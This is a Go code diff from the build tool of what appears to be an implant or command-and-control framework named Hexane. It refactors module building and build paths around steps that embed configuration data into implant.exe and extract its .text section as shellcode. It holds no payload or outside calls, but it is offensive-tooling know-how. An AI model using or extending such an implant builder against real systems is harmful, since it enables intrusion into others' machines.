@@ -33,15 +33,13 @@ func (h *HexaneConfig) BuildModule(modCfg *Object) error {
 		return fmt.Errorf("output name is required")
 	}
 
-	modCfg.OutputName = filepath.Join(BuildPath, modCfg.OutputName)
-
 	if modCfg.PreBuildDependencies != nil {
 		for _, pre := range modCfg.PreBuildDependencies {
-
 			if dep, err = GetModuleConfig(pre); err != nil {
 				return err
 			}
-			if err = h.CompileFiles(dep); err != nil {
+
+			if err = h.BuildModule(dep); err != nil {
 				return err
 			}
 
@@ -50,12 +48,11 @@ func (h *HexaneConfig) BuildModule(modCfg *Object) error {
 		}
 	}
 
-	WrapMessage("DBG", "adding components for "+modCfg.OutputName)
 	for _, src := range modCfg.Sources {
 		cmp := filepath.Join(modCfg.SourceDirectory, src)
 
+		WrapMessage("DBG", "adding component - "+cmp)
 		modCfg.Components = append(modCfg.Components, cmp)
-		WrapMessage("DBG", "\t-"+cmp)
 	}
 
 	if modCfg.Dependencies != nil {
@@ -86,7 +83,7 @@ func (h *HexaneConfig) RunBuild() error {
 		return err
 	}
 
-	if err = SearchFile(filepath.Join(CorePath, "build"), "corelib.a"); err != nil {
+	if err = SearchFile(BuildPath, "corelib.o"); err != nil {
 		if err.Error() == FileNotFound.Error() {
 
 			WrapMessage("DBG", "generating corelib\n")
@@ -110,12 +107,12 @@ func (h *HexaneConfig) RunBuild() error {
 	}
 
 	WrapMessage("DBG", "embedding implant config data")
-	if err = h.EmbedSectionData(path.Join(ImplantPath, "build")+"/implant.exe", ".text$F", h.ConfigBytes); err != nil {
+	if err = h.EmbedSectionData(BuildPath+"/implant.exe", ".text$F", h.ConfigBytes); err != nil {
 		return err
 	}
 
 	WrapMessage("DBG", "extracting shellcode")
-	if err = h.CopySectionData(path.Join(ImplantPath, "build")+"/implant.exe", path.Join(h.CompilerCFG.BuildDirectory, "shellcode.bin"), ".text"); err != nil {
+	if err = h.CopySectionData(BuildPath+"/implant.exe", path.Join(h.CompilerCFG.BuildDirectory, "shellcode.bin"), ".text"); err != nil {
 		return err
 	}
 
